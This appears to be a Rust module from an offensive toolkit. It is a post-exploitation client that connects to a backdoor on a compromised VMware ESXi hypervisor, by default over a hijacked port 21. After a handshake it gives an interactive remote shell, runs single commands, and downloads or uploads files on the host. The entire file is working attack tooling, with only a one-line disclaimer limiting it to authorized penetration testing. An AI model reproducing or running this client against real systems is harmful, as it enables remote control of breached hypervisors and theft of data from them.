// ESXi VSOCK Post-Exploitation Client
// For use after successful VM escape exploitation
//
// This module implements a VSOCK client that can communicate with
// the VSOCKpuppet backdoor (or similar) on a compromised ESXi host.
//
// Protocol:
// 1. Connect to CID 2 (hypervisor) on VSOCK port 10000
// 2. Handshake: send "test" + "ok", receive "ok"
// 3. Commands: GET <path>, POST <path> <data>, or shell commands
//
// For authorized penetration testing only.

use anyhow::{anyhow, Result};
use colored::*;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

use crate::utils::{normalize_target, prompt_default};

const DEFAULT_TIMEOUT_SECS: u64 = 30;

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   ESXi VSOCK Post-Exploitation Client                             ║".cyan());
    println!("{}", "║   For interacting with VSOCKpuppet backdoor on ESXi               ║".cyan());
    println!("{}", "║                                                                   ║".cyan());
    println!("{}", "║   Modes:                                                          ║".cyan());
    println!("{}", "║   1. Interactive Shell                                            ║".cyan());
    println!("{}", "║   2. Download File (GET)                                          ║".cyan());
    println!("{}", "║   3. Upload File (POST)                                           ║".cyan());
    println!("{}", "║   4. Execute Single Command                                       ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
    println!();
    println!("{}", "[!] Note: VSOCK requires the attack to be run FROM WITHIN a VM".yellow());
    println!("{}", "[!] This module uses TCP fallback for testing (port 21 hijack)".yellow());
    println!();
}

/// Connect to ESXi backdoor via TCP (inetd hijack on port 21)
fn connect_backdoor_tcp(host: &str, port: u16) -> Result<TcpStream> {
    let addr = format!("{}:{}", host, port);
    let stream = TcpStream::connect_timeout(
        &addr.parse().map_err(|_| anyhow!("Invalid address"))?,
        Duration::from_secs(DEFAULT_TIMEOUT_SECS),
    ).map_err(|e| anyhow!("Connection failed: {}", e))?;
    
    stream.set_read_timeout(Some(Duration::from_secs(DEFAULT_TIMEOUT_SECS)))?;
    stream.set_write_timeout(Some(Duration::from_secs(DEFAULT_TIMEOUT_SECS)))?;
    
    Ok(stream)
}

/// Perform VSOCK handshake
fn handshake(stream: &mut TcpStream) -> Result<bool> {
    // Send "test"
    stream.write_all(b"test")?;
    
    // Send "ok"
    stream.write_all(b"ok")?;
    
    // Read response
    let mut buf = [0u8; 2];
    match stream.read_exact(&mut buf) {
        Ok(_) => {
            if &buf == b"ok" {
                return Ok(true);
            }
        }
        Err(_) => {}
    }
    
    Ok(false)
}

/// Send command and receive response
fn send_command(stream: &mut TcpStream, cmd: &str) -> Result<String> {
    // Length-prefixed message
    let cmd_bytes = cmd.as_bytes();
    let len = cmd_bytes.len() as u32;
    stream.write_all(&len.to_le_bytes())?;
    stream.write_all(cmd_bytes)?;
    
    // Read response length
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf)?;
    let resp_len = u32::from_le_bytes(len_buf) as usize;
    
    // Read response
    let mut resp_buf = vec![0u8; resp_len];
    stream.read_exact(&mut resp_buf)?;
    
    Ok(String::from_utf8_lossy(&resp_buf).to_string())
}

/// Interactive shell mode
pub async fn interactive_shell(host: &str, port: u16) -> Result<()> {
    println!("{}", format!("[*] Connecting to {}:{}...", host, port).cyan());
    
    let mut stream = connect_backdoor_tcp(host, port)?;
    
    println!("{}", "[*] Performing handshake...".cyan());
    if !handshake(&mut stream)? {
        return Err(anyhow!("Handshake failed - is the backdoor active?"));
    }
    
    println!("{}", "[+] Connected to ESXi backdoor!".green().bold());
    println!("{}", "[*] Type 'exit' to quit, 'get <path>' to download, 'post <path>' to upload".dimmed());
    println!();
    
    use std::io::Write;
    let stdin = std::io::stdin();
    
    loop {
        print!("{}", "esxi# ".red());
        std::io::stdout().flush()?;
        
        let mut input = String::new();
        if stdin.read_line(&mut input).is_err() {
            break;
        }
        
        let cmd = input.trim();
        if cmd.is_empty() {
            continue;
        }
        
        if cmd == "exit" || cmd == "quit" {
            println!("{}", "[*] Disconnecting...".cyan());
            break;
        }
        
        match send_command(&mut stream, cmd) {
            Ok(response) => {
                println!("{}", response);
            }
            Err(e) => {
                println!("{}", format!("[-] Error: {}", e).red());
            }
        }
    }
    
    Ok(())
}

/// Download file from ESXi
pub async fn get_file(host: &str, port: u16, remote_path: &str, local_path: &str) -> Result<()> {
    println!("{}", format!("[*] Connecting to {}:{}...", host, port).cyan());
    
    let mut stream = connect_backdoor_tcp(host, port)?;
    
    if !handshake(&mut stream)? {
        return Err(anyhow!("Handshake failed"));
    }
    
    let cmd = format!("get {}", remote_path);
    let content = send_command(&mut stream, &cmd)?;
    
    std::fs::write(local_path, &content)?;
    println!("{}", format!("[+] Downloaded {} -> {}", remote_path, local_path).green());
    
    Ok(())
}

/// Upload file to ESXi
pub async fn post_file(host: &str, port: u16, local_path: &str, remote_path: &str) -> Result<()> {
    println!("{}", format!("[*] Connecting to {}:{}...", host, port).cyan());
    
    let mut stream = connect_backdoor_tcp(host, port)?;
    
    if !handshake(&mut stream)? {
        return Err(anyhow!("Handshake failed"));
    }
    
    let content = std::fs::read_to_string(local_path)?;
    let cmd = format!("post {} {}", remote_path, content);
    let response = send_command(&mut stream, &cmd)?;
    
    println!("{}", format!("[+] Uploaded {} -> {}", local_path, remote_path).green());
    println!("{}", response);
    
    Ok(())
}

/// Execute single command
pub async fn exec_command(host: &str, port: u16, command: &str) -> Result<String> {
    let mut stream = connect_backdoor_tcp(host, port)?;
    
    if !handshake(&mut stream)? {
        return Err(anyhow!("Handshake failed"));
    }
    
    send_command(&mut stream, command)
}

/// Prompt helper
async fn prompt(message: &str) -> Result<String> {
    print!("{}: ", message);
    std::io::stdout().flush()?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    Ok(input.trim().to_string())
}

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    let host = normalize_target(target)?;
    println!("{}", format!("[*] Target ESXi: {}", host).cyan());
    
    // Default to port 21 (hijacked FTP via inetd)
    let port: u16 = prompt_default("Backdoor Port (TCP fallback)", "21")?.parse().unwrap_or(21);
    
    println!();
    println!("{}", "Select mode:".yellow().bold());
    println!("  1. Interactive Shell");
    println!("  2. Download File (GET)");
    println!("  3. Upload File (POST)");
    println!("  4. Execute Single Command");
    println!();
    
    let mode = prompt_default("Mode", "1")?;
    
    match mode.as_str() {
        "1" => {
            interactive_shell(&host, port).await?;
        }
        "2" => {
            let remote_path = prompt("Remote file path on ESXi").await?;
            let local_path = prompt("Local path to save").await?;
            get_file(&host, port, &remote_path, &local_path).await?;
        }
        "3" => {
            let local_path = prompt("Local file path").await?;
            let remote_path = prompt("Remote path on ESXi").await?;
            post_file(&host, port, &local_path, &remote_path).await?;
        }
        "4" => {
            let command = prompt("Command to execute").await?;
            let output = exec_command(&host, port, &command).await?;
            println!();
            println!("{}", output);
        }
        _ => {
            println!("{}", "[-] Invalid mode".red());
        }
    }
    
    println!();
    println!("{}", "[*] VSOCK client complete".green());
    
    Ok(())
}
